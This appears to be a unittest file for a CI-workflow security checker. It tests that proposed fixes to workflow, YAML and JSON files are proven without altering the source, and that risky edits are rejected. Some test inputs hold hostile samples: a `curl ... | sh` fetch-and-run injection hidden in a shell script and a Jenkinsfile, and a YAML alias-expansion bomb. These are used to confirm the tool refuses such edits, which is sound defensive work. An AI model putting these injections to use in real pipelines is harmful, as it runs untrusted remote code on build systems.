"""Offline proof through the real checker with a small ordinary CI workflow."""

import dataclasses
import json
from datetime import date, timedelta
from pathlib import Path
import subprocess
import shutil
import tempfile
import unittest
from unittest.mock import patch

from obaaf import checker, fix_proof
from obaaf.catalog import load
from obaaf.checker import baseline
from obaaf.fix_proof import Approval, CheckOptions, Edit, Promise, ProofError, prove


class FixProofTest(unittest.TestCase):
    def setUp(self):
        temp = tempfile.TemporaryDirectory()
        self.addCleanup(temp.cleanup)
        self.root = Path(temp.name)
        self.file = Path(".github/workflows/build.yml")
        path = self.root / self.file
        path.parent.mkdir(parents=True)
        path.write_text("name: Build\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n"
                        "    steps:\n      - uses: actions/checkout@v4\n")
        self.old = path.read_bytes()
        self.edit = Edit(self.file, self.old, self.old.replace(b"@v4", b"@" + b"1" * 40),
                         (("jobs", "build", "steps", 0, "uses"),))
        self.options = CheckOptions(path=self.file, platform="github", fail_on="high")
        result = checker.check(path, platform="github")
        self.finding = next(f for f in result.findings if f.rule == "OBAAF-GHA-008")
        self.promise = Promise(baseline.key(self.finding), self.finding.severity, self.finding.state, "gone")

    def test_proves_exact_removal_without_writing_source(self):
        result = prove(self.root, self.options, (self.edit,), (self.promise,))
        self.assertNotIn(self.finding.rule, [f.rule for f in result.findings])
        self.assertEqual((self.root / self.file).read_bytes(), self.old)

    def test_withholds_unpromised_and_duplicate_promises(self):
        for promises in ((), (self.promise, self.promise)):
            with self.subTest(promises=promises), self.assertRaises(ProofError):
                prove(self.root, self.options, (self.edit,), promises)

    def test_withholds_changed_unrelated_key_and_wrong_source_bytes(self):
        for edit in (dataclasses.replace(self.edit, after=self.edit.after.replace(b"Build", b"other")),
                     dataclasses.replace(self.edit, before=b"outdated")):
            with self.subTest(edit=edit), self.assertRaises(ProofError):
                prove(self.root, self.options, (edit,), (self.promise,))
        self.assertEqual((self.root / self.file).read_bytes(), self.old)

    def test_unexpected_file_change_during_check_is_detected(self):
        run = fix_proof.check_inputs
        def recording(root, *args):
            result = run(root, *args)
            if root != self.root and (root / self.file).read_bytes() != self.old:
                (root / "unexpected").write_bytes(b"some other writer")
            return result
        with patch.object(fix_proof, "check_inputs", recording), self.assertRaisesRegex(ProofError, "outside"):
            prove(self.root, self.options, (self.edit,), (self.promise,))

    def test_explicit_config_baseline_and_gate_are_used_for_acceptance(self):
        expiry = (date.today() + timedelta(days=30)).isoformat()
        config = Path("project.yml")
        text = (f"ignore:\n  - rule: {self.finding.rule}\n    path: '{self.finding.path}'\n"
                f"    reason: reviewed\n    until: '{expiry}'\n").encode()
        (self.root / config).write_bytes(text)
        base = Path("accepted.json")
        (self.root / base).write_text(json.dumps({"format": baseline.FORMAT, "findings": []}))
        options = dataclasses.replace(self.options, config=config, baseline=base, fail_on="low")
        edit = Edit(config, text, text + b"    owner: '@team'\n", (("ignore", 0, "owner"),))
        promise = dataclasses.replace(self.promise, outcome="accepted",
                                      approval=Approval("ignore", "@team", "reviewed", expiry))
        result = prove(self.root, options, (edit,), (promise,))
        for field in ("source", "owner", "reason", "expires"):
            with self.subTest(field=field), self.assertRaisesRegex(ProofError, "promised"):
                wrong = dataclasses.replace(promise.approval, **{field: "other"})
                prove(self.root, options, (edit,), (dataclasses.replace(promise, approval=wrong),))
        self.assertTrue(result.baseline_used)
        self.assertNotIn(self.finding.rule, [f.rule for f in result.gating(options.fail_on, load())])
        self.assertEqual((self.root / config).read_bytes(), text)
        (self.root / config).write_bytes(edit.after)
        owner_change = Edit(config, edit.after, edit.after.replace(b"@team", b"@other"),
                            (("ignore", 0, "owner"),))
        with self.assertRaisesRegex(ProofError, "acceptance"):
            prove(self.root, options, (owner_change,), ())

    def test_stale_baseline_or_ignore_withholds_even_at_never_threshold(self):
        expiry = (date.today() + timedelta(days=30)).isoformat()
        entry = baseline.entry_for(self.finding, "@team", "reviewed", expiry)
        base = Path("accepted.json")
        (self.root / base).write_text(json.dumps({"format": baseline.FORMAT, "findings": [entry]}))
        options = dataclasses.replace(self.options, fail_on="never", baseline=base)
        promised = dataclasses.replace(self.promise, previous="accepted")
        with self.assertRaisesRegex(ProofError, "no longer matches"):
            prove(self.root, options, (self.edit,), (promised,))
        config = Path("unused.yml")
        (self.root / config).write_text(f"ignore:\n  - rule: {self.finding.rule}\n    path: absent.yml\n"
                                       f"    reason: reviewed\n    until: '{expiry}'\n")
        with self.assertRaisesRegex(ProofError, "no longer matches"):
            prove(self.root, dataclasses.replace(options, baseline=None, config=config),
                  (self.edit,), (self.promise,))

    def test_sequence_removal_and_insertion_preserve_every_other_member(self):
        doc = Path("records.yml")
        for index in range(3):
            entries = ["alpha", "beta", "gamma"]
            original = json.dumps(entries).encode()
            entries.pop(index)
            shorter = json.dumps(entries).encode()
            for before, after, keys in ((original, shorter, {"removed": ((index,),)}),
                                        (shorter, original, {"added": ((index,),)})):
                with self.subTest(index=index, keys=keys):
                    (self.root / doc).write_bytes(before)
                    edit = Edit(doc, before, after, (), **keys)
                    prove(self.root, self.options, (edit,), ())
                    wrong = dataclasses.replace(edit, after=after.replace(b"alpha", b"omega")
                                                if index != 0 else after.replace(b"beta", b"omega"))
                    with self.assertRaisesRegex(ProofError, "structure changed"):
                        prove(self.root, self.options, (wrong,), ())

    @unittest.skipUnless(shutil.which("git"), "requires Git")
    def test_repository_default_platform_compares_the_actual_jenkins_files(self):
        subprocess.run(["git", "init", "-q"], cwd=self.root, check=True)
        (self.root / "build").mkdir()
        (self.root / "build/cache").write_text("ordinary build output")
        subprocess.run(["git", "add", "."], cwd=self.root, check=True)
        options = CheckOptions()
        result = checker.check(self.root)
        finding = next(f for f in result.findings if f.rule == "OBAAF-GHA-008")
        promise = Promise(baseline.key(finding), finding.severity, finding.state, "gone")
        prove(self.root, options, (self.edit,), (promise,))
        (self.root / "build/Jenkinsfile").write_text("pipeline { agent any }")
        with self.assertRaises(ProofError):
            prove(self.root, options, (self.edit,), (promise,))


class FixProofReviewTest(unittest.TestCase):
    """What the review of #274 got past the proof, each now withheld with a reason."""

    setUp = FixProofTest.setUp

    def test_json_compares_decoded_strings_and_exact_numbers(self):
        path = Path("metadata.JSON")
        for before_value, after_value in (
                ('"line one\u0085line two"', '"line one line two"'),
                ("1.00000000000000001", "1.00000000000000002"),
                ('"1e3"', "1e3"), ("-0", "0")):
            with self.subTest(before_value=before_value):
                before = ('{"name":"one","keep":' + before_value + '}').encode()
                after = ('{"name":"two","keep":' + after_value + '}').encode()
                (self.root / path).write_bytes(before)
                with self.assertRaisesRegex(ProofError, "structure changed"):
                    prove(self.root, self.options, (Edit(path, before, after, (("name",),)),), ())
                self.assertEqual((self.root / path).read_bytes(), before)

        # Escaped and literal forms of the same Unicode character denote the same JSON string.
        before = b'{"name":"one","keep":"caf\\u00e9","quantity":1e600}'
        after = '{"quantity":1e600,"keep":"café","name":"two"}'.encode()
        (self.root / path).write_bytes(before)
        prove(self.root, self.options, (Edit(path, before, after, (("name",),)),), ())

    def test_json_rejects_ambiguous_or_invalid_documents_on_either_side(self):
        path = Path("metadata.json")
        valid = b'{"name":"one"}'
        for invalid in (b'{"name":"two","na\\u006de":"three"}', b'{name: two}',
                        b'{"name":NaN}', b'{"name":Infinity}', b'{"name":-Infinity}'):
            for before, after in ((valid, invalid), (invalid, valid)):
                with self.subTest(invalid=invalid, invalid_before=before == invalid):
                    (self.root / path).write_bytes(before)
                    with self.assertRaises(ProofError):
                        prove(self.root, self.options, (Edit(path, before, after, (("name",),)),), ())
                    self.assertEqual((self.root / path).read_bytes(), before)

    def test_an_edit_to_a_file_that_is_not_yaml_or_json_is_withheld(self):
        for name, before, after in (
                ("scripts/build.sh", b'echo "building # step 1"\n',
                 b'echo "building # $(curl -s https://example.invalid/x | sh)"\n'),
                ("Jenkinsfile", b"node { sh 'make # all' }\n", b"node { sh 'make # ; curl x | sh' }\n")):
            with self.subTest(name=name):
                path = self.root / name
                path.parent.mkdir(parents=True, exist_ok=True)
                path.write_bytes(before)
                edit = Edit(Path(name), before, after, (("nothing",),))
                with self.assertRaisesRegex(ProofError, "only YAML or JSON|is a Jenkinsfile"):
                    prove(self.root, self.options, (edit,), ())
                self.assertEqual(path.read_bytes(), before)
                path.unlink()

    def test_a_declared_key_must_name_a_node(self):
        doc = Path("records.yml")
        before = b"a: 1  # one\nlist: [x, y]\n"
        (self.root / doc).write_bytes(before)
        after = b"a: 1  # two\nlist: [x, y]\n"
        for keys in ({"keys": (("missing",),)}, {"keys": (("list", 5),)}, {"keys": (("a", "deeper"),)},
                     {"keys": (), "removed": (("list", 2),)}, {"keys": (), "added": (("list", 2),)}):
            with self.subTest(keys=keys), self.assertRaisesRegex(ProofError, "names nothing"):
                prove(self.root, self.options, (Edit(doc, before, after, **keys),), ())
        prove(self.root, self.options, (Edit(doc, before, after, (("a",),)),), ())

    def test_a_document_that_is_not_a_mapping_or_list_is_withheld(self):
        doc = Path("plain.yaml")
        (self.root / doc).write_bytes(b"one # first\n")
        edit = Edit(doc, b"one # first\n", b"one # second\n", ((0,),))
        with self.assertRaisesRegex(ProofError, "not a mapping or a list"):
            prove(self.root, self.options, (edit,), ())

    def test_a_value_the_comparison_cannot_hold_is_a_refusal_not_a_crash(self):
        doc = Path("records.yml")
        for value in (b"!!set {a: null}", b"!!omap [{k: {x: 1}}]", b"!!pairs [{k: [1]}]"):
            with self.subTest(value=value):
                before = b"items: " + value + b"\nowner: one\n"
                (self.root / doc).write_bytes(before)
                edit = Edit(doc, before, before.replace(b"owner: one", b"owner: two"), (("owner",),))
                with self.assertRaisesRegex(ProofError, "kind the proof does not compare"):
                    prove(self.root, self.options, (edit,), ())

    def test_aliases_expanding_past_the_limit_are_withheld_quickly(self):
        import time
        lines = ["l0: &l0 [x, x, x, x, x, x, x, x, x, x]"]
        lines += [f"l{n}: &l{n} [{', '.join([f'*l{n - 1}'] * 10)}]" for n in range(1, 8)]
        before = ("\n".join(lines) + "\nowner: one\n").encode()
        doc = Path("bomb.yml")
        (self.root / doc).write_bytes(before)
        edit = Edit(doc, before, before.replace(b"owner: one", b"owner: two"), (("owner",),))
        started = time.monotonic()
        with self.assertRaisesRegex(ProofError, "more than 500,000 values"):
            prove(self.root, self.options, (edit,), ())
        self.assertLess(time.monotonic() - started, 30)

    def test_a_source_change_while_the_proof_runs_is_withheld(self):
        run = fix_proof.check_inputs
        source = self.root / self.file

        def changing(root, *args):
            result = run(root, *args)
            if Path(root) == self.root.absolute():
                source.write_bytes(self.old + b"# changed while the proof ran\n")
            return result

        with patch.object(fix_proof, "check_inputs", changing), self.assertRaisesRegex(ProofError, "changed while"):
            prove(self.root, self.options, (self.edit,), (self.promise,))

    def test_a_jenkinsfile_named_like_yaml_is_withheld(self):
        (self.root / ".github/obaaf.yml").write_text("jenkins:\n  files: [ci/pipeline.yml]\n")
        (self.root / "ci").mkdir()
        before = b"a: node { sh 'make # all' }\nb: echo 'one'\n"
        after = b"a: node { sh 'make # all' }; node { sh 'make deploy-prod' }\nb: echo 'two'\n"
        (self.root / "ci/pipeline.yml").write_bytes(before)
        options = CheckOptions(path=Path("."), platform="auto", fail_on="high")
        self.assertIn("ci/pipeline.yml", checker.check(
            self.root, platform="auto", config=checker.Config.load(self.root, None)).jenkins_files)
        edit = Edit(Path("ci/pipeline.yml"), before, after, (("b",),))
        with self.assertRaisesRegex(ProofError, "is a Jenkinsfile"):
            prove(self.root, options, (edit,), ())
        self.assertEqual((self.root / "ci/pipeline.yml").read_bytes(), before)

    def test_a_jenkinsfile_the_run_does_not_read_is_still_withheld(self):
        (self.root / ".github/obaaf.yml").write_text("jenkins:\n  files: ['CI/*.YML']\n")
        (self.root / "ci").mkdir()
        before = b"a: node { sh 'make # all' }\nb: echo 'one'\n"
        after = b"a: node { sh 'make # all' }; node { sh 'make deploy-prod' }\nb: echo 'two'\n"
        cases = {"ci/pipeline.yml": None, "ci/Jenkinsfile.yml": None}
        for name in cases:
            with self.subTest(name=name):
                (self.root / name).write_bytes(before)
                edit = Edit(Path(name), before, after, (("b",),))
                for options in (self.options, dataclasses.replace(self.options, path=Path(".github/workflows")),
                                CheckOptions(path=Path("."), platform="github", fail_on="high")):
                    with self.assertRaisesRegex(ProofError, "is a Jenkinsfile"):
                        prove(self.root, options, (edit,), ())
                (self.root / name).unlink()
